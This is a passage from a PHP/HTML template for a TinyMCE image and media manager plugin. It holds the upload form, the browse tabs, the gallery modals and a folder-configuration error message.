		<tr class="template-upload">
			<td class="preview"><span class=""></span></td>
			<td class="name"><span>{%=file.name%}</span></td>
			<td class="size"><span>{%=o.formatFileSize(file.size)%}</span></td>
			{% if (file.error) { %}
				<td class="error" colspan="2"><span class="label label-important">{%=locale.fileupload.error%}</span> {%=locale.fileupload.errors[file.error] || file.error%}</td>
			{% } else if (o.files.valid && !i) { %}
				<td style="display:none;">
					<div class="progress progress-success progress-striped active" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"><div class="bar" style="width:0%;"></div></div>
				</td>
				<td class="start">{% if (!o.options.autoUpload) { %}
					<button class="btn btn-primary" style="display:none;">
						<i class="icon-upload icon-white"></i>
						<span>{%=locale.fileupload.start%}</span>
					</button>
				{% } %}</td>
			{% } else { %}
				<td colspan="2"></td>
			{% } %}
			<td class="cancel" style="display:none;">{% if (!i) { %}
				<button class="btn btn-function btn-cancel">
					<i class="icon-ban-circle icon-black"></i>
					<!--<span>{%=locale.fileupload.cancel%}</span>-->
				</button>
			{% } %}</td>
		</tr>
	{% } %}
	</script>
	<!-- The template to display files available for download -->
	<script id="template-download" type="text/x-tmpl">
	</script>
</head>
<body>
<?php
	if(!$uploadfolderset)
	{
?>
	<div class="alert alert-error alert-block" style="font-size:14px;">
		<h4>Error!</h4>
		<br />The upload folder is not correctly configured, please ensure the '<strong>open_manager_upload_path</strong>' variable is correctly initialised in TinyMCE, the path must be absolute or relative (from this plugins directory, where the 'index.php' file resides).<br /><br />
		The upload folder must also contain the following directory structure and have the correct permissions set <em>(this script will try to create the sub directories automatically however depending on server setup/permissions this may not be possible)</em>.<br /><br />
		<pre>uploadfolder/images
uploadfolder/images/thumbs
uploadfolder/media</pre>
	</div>
<?php
	}
	else
	{
?>
	<ul class="nav nav-tabs">
			<?php 
			if($mediatype=="media")
			{
				$ubuttontext = "media";
			?>
		<li<?php echo ($tabno==1)?" class=\"active\"":""; ?>><a href="#home" data-toggle="tab">Upload Media</a></li>
		<li<?php echo ($tabno==2)?" class=\"active\"":""; ?>><a href="#media" data-toggle="tab">Browse Media</a></li>
			<?php
			}
			else
			{
				$ubuttontext = "image";
			?>
		<li class="active"><a href="#home" data-toggle="tab" id="uploadtab">Upload Image</a></li>
		<li><a href="#images" data-toggle="tab" id="browsetab">Browse Images</a></li>
			<?php
			}
			?>
	</ul>
	<div class="tab-content">
		<div class="tab-pane<?php echo ($tabno==1)?" active":""; ?>" id="home">
			<div id="upload-img">
				<form class="fileuploadsingle" action="php/fileactions.php?s=uploadfile" method="POST" enctype="multipart/form-data">
					<input type="hidden" name="mediatype" value="<?php echo $mediatype; ?>" />
					<input type="hidden" name="uploadfolder" value="<?php echo $uploadfolder; ?>" />
					<div class="row fileupload-buttonbar">
						<div class="span7" style="width:95%;float:left;">
							<!-- The fileinput-button span is used to style the file input field as button -->
						   <span class="btn btn-small btn-success fileinput-button">
								<span><i class="icon-plus icon-white"></i> Add <?php echo $ubuttontext; ?></span>
								<input type="file" name="userfile" class="btnupload">
							</span>
							<button type="submit" class="btn btn-small btn-primary start disabled" disabled="disabled">
							<!--<button type="submit" class="btn btn-primary start">-->
								<i class="icon-upload icon-white"></i> Start upload
							</button>
							<button type="reset" class="btn btn-small btn-function cancel disabled" disabled="disabled">
								<i class="icon-ban-circle icon-black"></i> Cancel upload
							</button>
						</div>
						
						<div class="clear"></div>
					</div>
					<div class="clear"></div>
					<!-- The table listing the files available for upload/download -->
					<table class="table table-striped"><tbody class="files" data-toggle="modal-gallery" data-target="#modal-gallery"></tbody></table>
					
					<div class="span5 fileupload-progress fade" style="display:none;">
						<!-- The global progress bar -->
						<div class="progress progress-success progress-striped active" role="progressbar" aria-valuemin="0" aria-valuemax="100">
							<div class="bar" style="width:0%;"></div>
						</div>
						<!-- The extended global progress information -->
						<div class="progress-extended">&nbsp;</div>
					</div>
				</form>
			</div>
		</div>
		<?php 
		if(($mediatype=="")||($mediatype=="image"))
		{
		?>
		<div class="tab-pane<?php echo ($tabno==2)?" active":""; ?>" " id="images">
			<div class="cmask">
			<div id="gallery" data-toggle="modal-gallery" data-target="#modal-gallery">
				<?php

					/*if($nopages>1)
					{
						for($i=1; $i<=$nopages; $i++)
						{
							echo '<div class="cpage" id="gallery'.$i.'"></div>';
						}
						
					}*/
				?>
			</div>
			</div>
		</div>
		<?php
		}
		else if($mediatype=="media")
		{
		?>
		<div class="tab-pane<?php echo ($tabno==2)?" active":""; ?>" id="media" style="">
			<?php
				@include("encodeexplorer.php");
			?>
		</div>
		<?php
		}
		?>
		
	</div>
	<div class="pagination pagination-centered" style="margin:10px 0 0 0;">
	<?php
		//display_gallery_pagination("",count($files_array));
	?>
	</div>
	<div id="modal-gallery" class="modal modal-gallery hide fade" tabindex="-1">
		<div class="modal-header">
			<a class="close" data-dismiss="modal">&times;</a>
			<h3 class="modal-title"></h3>
		</div>
		<div class="modal-body"><div class="modal-image"></div></div>
		<div class="modal-footer">
			<a class="btn btn-danger modal-delete" target="_blank" style="float:left;" data-dismiss="modal">
				<i class="icon-trash icon-white"></i>
				<span>Delete</span>
			</a>
			
			<a class="btn btn-success modal-insert" target="_blank">
				<i class="icon-upload icon-white"></i>
				<span>Insert</span>
			</a>
			<a class="btn btn-function modal-prev">
				<i class="icon-arrow-left"></i>
				<span>Previous</span>
			</a>
			<a class="btn btn-function modal-next">
				<span>Next</span>
				<i class="icon-arrow-right"></i>
			</a>
		</div>
	</div>
	<div id="modal-gallery-no-del" class="modal modal-gallery hide fade" tabindex="-1">
		<div class="modal-header">
			<a class="close" data-dismiss="modal">&times;</a>
			<h3 class="modal-title"></h3>
		</div>
		<div class="modal-body"><div class="modal-image"></div></div>
		<div class="modal-footer">
			<a class="btn btn-success modal-insert" target="_blank">
				<i class="icon-upload icon-white"></i>
				<span>Insert</span>
			</a>
			<a class="btn btn-function modal-prev">
				<i class="icon-arrow-left"></i>
				<span>Previous</span>
			</a>
			<a class="btn btn-function modal-next">
				<span>Next</span>
				<i class="icon-arrow-right"></i>
			</a>
		</div>
	</div>
<?php
	}
?>
	<div style="position:absolute;bottom:20px;right:20px;width:auto;text-align:right;">
		<!--<button type="submit" class="btn btn-success start disabled" value="{#insert}" onclick="ElvtImageDialog.insert();" disabled="disabled">
			<i class="icon-upload icon-white"></i> {#insert}
		</button>-->
		<button type="submit" class="btn btn-danger start" onclick="tinyMCEPopup.close();">
			<i class="icon-ban-circle icon-white"></i> {#cancel}
		</button>
	</div>
</body>
</html>
